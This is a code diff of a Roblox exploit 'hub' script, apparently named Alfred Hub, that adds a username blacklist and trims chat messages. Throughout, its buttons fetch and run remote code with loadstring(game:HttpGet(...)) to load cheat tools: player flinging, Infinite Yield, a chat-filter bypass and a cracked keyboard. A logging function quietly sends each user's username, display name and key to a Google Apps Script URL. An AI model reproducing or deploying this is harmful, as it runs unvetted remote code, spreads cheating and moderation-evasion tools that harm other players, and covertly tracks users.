@@ -3,27 +3,16 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TextChatService = game:GetService("TextChatService")
 
--- GOOGLE LOGGING URL (DO NOT CHANGE)
+-- CONFIGURATION & DATABASE
 local GoogleSheetURL = "https://script.google.com/macros/s/AKfycbzDJ2Q2BvwYSqs3UIqyW1PlXBJfGdPnHBbMaXKMLIooXCvfGEoi8lVIfHmT9JFIc26M/exec"
-
--- Chat Function
-local function SendChatMessage(msg)
-    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        local channel = TextChatService.TextChannels.RBXGeneral
-        channel:SendAsync(msg)
-    else
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
-    end
-end
-
-local LocalPlayer = Players.LocalPlayer
-
--- CONFIGURATION
 local OwnerUser = "Dadrails912"
 local PermKey = "AIfredFESCRlPTS"
 local SaveFile = "AlfredAuth.json"
 
--- KEYS LIST (30 Randomized Keys)
+-- BLACKLIST (Add usernames here, separated by commas)
+local BlacklistedUsers = {"BadPlayer123", "ExploitLeaker88"}
+
+-- KEYS LIST
 local ValidFreeKeys = {
     ["Alfredfreekey24hr"] = true,
     ["Alfredfreekey24hr-1432"] = true, ["Alfredfreekey24hr-8854"] = true, ["Alfredfreekey24hr-2109"] = true,
@@ -38,28 +27,39 @@ local ValidFreeKeys = {
     ["Alfredfreekey24hr-9876"] = true, ["Alfredfreekey24hr-2580"] = true, ["Alfredfreekey24hr-4040"] = true
 }
 
--- LOGGING FUNCTION
-local function LogToSheet(key)
-    local url = GoogleSheetURL .. "?username=" .. LocalPlayer.Name .. "&nickname=" .. LocalPlayer.DisplayName .. "&key=" .. key
-    pcall(function()
-        game:HttpGet(url)
-    end)
+local LocalPlayer = Players.LocalPlayer
+
+-- Blacklist Check Function
+local isBlacklisted = false
+for _, name in pairs(BlacklistedUsers) do
+    if LocalPlayer.Name == name then
+        isBlacklisted = true
+        break
+    end
 end
 
-local MyData = {Rank = "Guest", ExpireTime = 0}
+-- Logging Function
+local function LogToSheet(key)
+    local url = GoogleSheetURL .. "?username=" .. LocalPlayer.Name .. "&nickname=" .. LocalPlayer.DisplayName .. "&key=" .. key
+    pcall(function() game:HttpGet(url) end)
+end
 
--- AUTH LOGIC
+-- Save System
+local MyData = {Rank = "Guest", ExpireTime = 0}
 if isfile(SaveFile) then
     local success, data = pcall(function() return HttpService:JSONDecode(readfile(SaveFile)) end)
     if success then MyData = data end
 end
-
 if LocalPlayer.Name == OwnerUser then MyData.Rank = "Owner" end
-
 local function Save() writefile(SaveFile, HttpService:JSONEncode(MyData)) end
 
--- MAIN HUB
+-- Main Hub
 local function LoadHub()
+    if isBlacklisted then 
+        LocalPlayer:Kick("You are blacklisted from Alfred Hub.") 
+        return 
+    end
+
     local Window = Rayfield:CreateWindow({
         Name = "Alfred Simple Accessories Hub",
         LoadingTitle = "Rank: " .. MyData.Rank,
@@ -71,31 +71,28 @@ local function LoadHub()
 
     local ScriptTab = Window:CreateTab("Scripts", 4483362458)
     ScriptTab:CreateButton({Name = "Invisible FE", Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))() end})
-    
-    -- UPDATED FLING BUTTON
     ScriptTab:CreateButton({Name = "Fling People FE", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AlfredFEscripts/Fling-All-script./main/Fling%20people.lua"))() end})
-    
     ScriptTab:CreateButton({Name = "Quizbot", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))() end})
     ScriptTab:CreateButton({Name = "Infinite Yield", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end})
     ScriptTab:CreateButton({Name = "Scriptblox Searcher", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))() end})
     ScriptTab:CreateButton({Name = "Delta Keyboard", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))() end})
-    ScriptTab:CreateButton({Name = "Dances FE (Requires Keyboard)", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/UP-Just-a-baseplate.-KDV3-Modded-177753"))() end})
+    ScriptTab:CreateButton({Name = "Dances FE", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/UP-Just-a-baseplate.-KDV3-Modded-177753"))() end})
     ScriptTab:CreateButton({Name = "Sky Hub", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sky-Hub-18710"))() end})
     ScriptTab:CreateButton({Name = "Fearless Chat Bypass", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fearless-Chat-Bypass-101789"))() end})
 end
 
--- KEY SYSTEM STARTUP
+-- Key System
 local function StartKeySystem()
-    SendChatMessage("AlfredCracked-Scripts, Welcome!")
-    task.wait(2)
+    if isBlacklisted then 
+        LocalPlayer:Kick("You are blacklisted from Alfred Hub.") 
+        return 
+    end
 
     if MyData.Rank == "Owner" or MyData.Rank == "Permanent" then
         LoadHub() return
     elseif MyData.Rank == "Free" and os.time() < MyData.ExpireTime then
         LoadHub() return
     end
-
-    SendChatMessage("Access denied, Enter key to continue")
 
     local keyGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
     local keyFrame = Instance.new("Frame", keyGui)
@@ -119,7 +116,7 @@ local function StartKeySystem()
             MyData.Rank = "Free"
             MyData.ExpireTime = os.time() + 86400
             Save()
-            LogToSheet(input.Text) -- This writes to your sheet!
+            LogToSheet(input.Text)
             keyGui:Destroy()
             LoadHub()
         else
